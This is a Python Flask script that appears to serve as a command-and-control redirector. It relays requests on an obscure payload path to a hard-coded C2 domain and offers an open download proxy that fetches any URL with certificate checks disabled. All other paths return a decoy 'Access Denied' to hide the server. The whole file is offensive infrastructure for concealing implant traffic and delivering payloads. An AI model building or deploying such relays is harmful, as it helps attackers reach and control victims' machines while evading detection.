from flask import Flask, request, Response
import requests

app = Flask(__name__)

domain = "c2.blindsecurity.gr"
payloaduri = "payload124867931"
downloaduri = "download124867931"

ALLOWED_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]

def proxy_request(target_url):
    try:
        # Forward headers, excluding 'Host' to avoid conflicts
        headers = {k: v for k, v in request.headers.items() if k.lower() != 'host'}

        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            data=request.get_data(),
            params=request.args,
            cookies=request.cookies,
            verify=False,
            allow_redirects=False
        )

        excluded_headers = {'content-encoding', 'transfer-encoding', 'content-length', 'connection'}
        response_headers = [(k, v) for k, v in resp.headers.items() if k.lower() not in excluded_headers]

        return Response(resp.content, status=resp.status_code, headers=response_headers)

    except Exception as e:
        #return Response(f"Error: {str(e)}", status=500)
        return Response("Internal Server Error", status=500)

@app.route('/', defaults={'path': ''}, methods=ALLOWED_METHODS)
@app.route('/<path:path>', methods=ALLOWED_METHODS)
def catch_all(path):
    return Response("Access Denied", status=403)

@app.route(f'/{downloaduri}', methods=ALLOWED_METHODS)
def proxydownload():
    url = request.args.get('url')
    if not url:
        return "Missing 'url' parameter", 400
    return proxy_request(url)

@app.route(f'/{payloaduri}/', defaults={'path': ''}, methods=ALLOWED_METHODS)
@app.route(f'/{payloaduri}/<path:path>', methods=ALLOWED_METHODS)
def proxy(path):
    protocol = request.headers.get('X-Forwarded-Proto', 'http')
    scheme = 'https' if protocol == 'https' else 'http'
    target_url = f"{scheme}://{domain}/{payloaduri}/{path}"
    return proxy_request(target_url)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
